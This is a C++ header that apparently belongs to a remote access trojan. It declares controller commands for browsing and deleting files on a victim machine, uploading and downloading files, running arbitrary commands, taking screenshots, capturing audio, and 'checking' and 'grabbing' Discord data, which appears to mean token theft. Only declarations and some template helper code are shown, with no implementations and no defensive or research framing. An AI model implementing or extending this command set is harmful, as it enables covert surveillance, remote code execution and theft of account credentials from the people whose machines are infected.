#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <vector>
#include <memory>
#include <iostream>
#include <typeinfo>
#include <typeindex>
#include <functional>
#include "controller.h"

template<class...> struct X;
template<class T, class... Args> struct X<T, Args...> {
    static void build(std::vector<std::type_index>& list) {
        list.push_back(typeid(T));
        X<Args...>::build(list);
    }
};
template<> struct X<> {
    static void build(std::vector<std::type_index>& list) {}
};
template<class... Args> void build_typeinfos(std::vector<std::type_index>& list) {
    X<Args...>::build(list);
}

template<class... Args> void register_command(void(*builder)(Args...)) {
    std::vector<std::type_index> types;
    build_typeinfos<Args...>(types);
    for (const auto& t : types) {
        std::cout << t.name() << "\n";
    }
}

class CommandPacket {
public:
	template<int type> static std::unique_ptr<Packet> build(std::vector<char>& data);
};

enum class NavigateCommand {
	ls, cd, pwd, rm
};

enum class AudioCommand {
	start, stop, list
};

enum class DiscordCommand {
	check, grab
};

// navigation
int pwd(Controller* ctrl);
int changeDir(Controller* ctrl, const std::string path);
int listFiles(Controller* ctrl, const std::string path);
int removeFile(Controller* ctrl, const std::string path);

// files
int downloadFile(Controller* ctrl, const std::string path);
int uploadFile(Controller* ctrl, const std::string path, size_t size, const char* data);

// exec
int exec(Controller* ctrl, const std::string cmd, bool wait);

// screen
int screenshot(Controller* ctrl);

// audio
int audioCommand(Controller* ctrl, AudioCommand cmd);

// discord
int discordCommand(Controller* ctrl, DiscordCommand cmd);

#endif